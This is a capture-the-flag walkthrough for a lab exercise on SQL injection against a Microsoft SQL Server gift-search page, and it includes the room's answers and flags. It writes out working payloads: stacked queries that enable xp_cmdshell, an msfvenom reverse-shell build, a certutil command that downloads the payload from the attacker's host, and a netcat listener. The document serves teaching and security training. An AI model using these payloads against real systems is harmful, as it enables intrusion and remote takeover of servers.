# Day_10 [SQLInjection] Inject the Halls with EXEC Queries

+ Deployable Machine: Yes

Description: The Best Festival Company started receiving many reports that their company website, bestfestival.thm, is displaying some concerning information about the state of Christmas this year! After looking into the matter, Santa's Security Operations Center (SSOC) confirmed that the company website has been hijacked and ultimately defaced, causing significant reputational damage. To make matters worse, the web development team has been locked out of the web server as the user credentials have been changed. With no other way to revert the changes, Elf Exploit McRed has been tasked with attempting to hack back into the server to regain access. This forum post surely explains the havoc that has gone on over the past week. Armed with this knowledge, Elf Exploit McRed began testing the company website from the outside to find the vulnerable components that led to the server compromise. As a result of McRed's thorough investigation, the team now suspects a possible SQL injection vulnerability.

> IP: [10.10.168.236]

## LEARNING OBJECTIVES

1. Learn to understand and identify SQL injection vulnerabilities
2. Exploit stacked queries to turn SQL injection into remote code execution
3. Help Elf McRed restore the Best Festival website and save its reputation!

## OVERVIEW

1. xp_cmdshell
   1. xp_cmdshell is a system-extended stored procedure in Microsoft SQL Server that enables the execution of operating system commands and programs from within SQL Server. It provides a mechanism for SQL Server to interact directly with the host operating system's command shell. While it can be a powerful administrative tool, it can also be a security risk if not used cautiously when enabled.

## STEPS

1. Deploy Machine
2. Navigate to website
   1. At first we see a defaced website
   2. All the links are anchors to sections on the home page
   3. One link takes you to a separate page `/giftsearch.php`
   4. Lets test the search function
3. GIFTSEARCH.PHP
   1. Set search to age -> child, interests -> toys, budget -> $10
      1. The URL redirects with the parameters to: "/giftresults.php?age=child&interests=toys&budget=10"
   2. So lets try injection
      1. "/giftresults.php?age=' OR 1=1 --"
         1. This outputs every toy, and at the end of the database entries we see `THM{a4ffc901c27fb89efe3c31642ece4447}`
   3. Lets try an injection that shouldn't work that way we can hopefully see an error
      1. "/giftresults.php?age='&interests=toys&budget=10"
         1. RESPONSE:

            ```text
               Database query error: Array ( [0] => Array ( [0] => 42000 [SQLSTATE] => 42000 [1] => 102 [code] => 102 [2] => [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Incorrect syntax near 'toys'. [message] => [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Incorrect syntax near 'toys'. ) [1] => Array ( [0] => 42000 [SQLSTATE] => 42000 [1] => 105 [code] => 105 [2] => [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Unclosed quotation mark after the character string ''. [message] => [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Unclosed quotation mark after the character string ''. ) )
            ```

            1. In here we can see that the ODBC Driver is `ODBC Driver 17 for SQL Server`
4. XP_CMDSHELL
   1. Manually enable xp_cmdshell
      1. Payload "giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --"
      2. Now we should be able to run commands with EXEC
5. EXPLOIT
   1. MSFVENOM
      1. We need to craft a payload specifically for our "Microsoft SQL Server"
         1. > msfvenom -p windows/x64/shell_reverse_tcp LHOST=[MY_IPP_ADDR] LPORT=4444 -f exe -o reverse.exe
            1. Success! Now we have a reverse.exe file
   2. PYTHON SERVER
      1. We need to now host a local server that way our payload can be "downloaded" from our attack machine to the remote machine
         1. > python3 -m http.server
   3. SQLi PAYLAOD
      1. Now we need to craft our SQL Injection
         1. "/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://[MY_IPP_ADDR]:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --"
            1. And now we shoudl see our python server see a request!
               1. Success!
   4. RCE
      1. Now that we have "uploaded" our reverse shell we setup a netcat listner and then invoke the command to execute reverse.exe
         1. > nc -lnvp 4444
         2. EXECUTE: "giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --"
            1. SUCCESS!!!
6. ENUMERATION
   1. Lets look for a note
      1. > cd C:\Users\Administrator\Desktop
      2. > dir 
         1. We see a note.txt lets look at it
            1. > type Note.txt

               ```text
                  Hey h4ck3r0192,

                  I recieved your Bitcoin payment, thanks again for a speedy transaction.
                  After you gain access to the server, you can deface the website by running the deface_website.bat script in C:\Users\Administrator\Desktop. Feel free to dump the database and steal whatever you want.
                  If you need to revert the changes back to the original site for any reason, just run restore_website.bat from the same directory.
                  Also, I shouldn't need to mention this, but PLEASE DELETE this Note.txt file after defacing the website! Do NOT let this hack tie back to me.
                  -Gr33dstr

                  THM{b06674fedd8dfc28ca75176d3d51409e}
               ```

7. RESTORE SITE
   1. In the note we see there is a deface-website.bat, but there is alos a restore_website.bat file on the desktop lets run it!
      1. > .\restore_website.bat

         ```text
            Removing all files and folders from C:\inetpub\wwwroot...
            Website restoration completed. Please refresh the home (/index.php) page to see the changes and obtain your flag!
         ```

      2. Now lets go back to the home page
         1. FLAG: `THM{4cbc043631e322450bc55b42c}`


## QUESTIONS

1. Manually navigate the defaced website to find the vulnerable search form. What is the first webpage you come across that contains the gift-finding feature?
   1. `/giftsearch.php`
2. Analyze the SQL error message that is returned. What ODBC Driver is being used in the back end of the website?
   1. `ODBC Driver 17 for SQL Server`
3. Inject the 1=1 condition into the Gift Search form. What is the last result returned in the database?
   1. `THM{a4ffc901c27fb89efe3c31642ece4447}`
4. What flag is in the note file Gr33dstr left behind on the system?
   1. `THM{b06674fedd8dfc28ca75176d3d51409e}`
5. What is the flag you receive on the homepage after restoring the website?
   1. `THM{4cbc043631e322450bc55b42c}`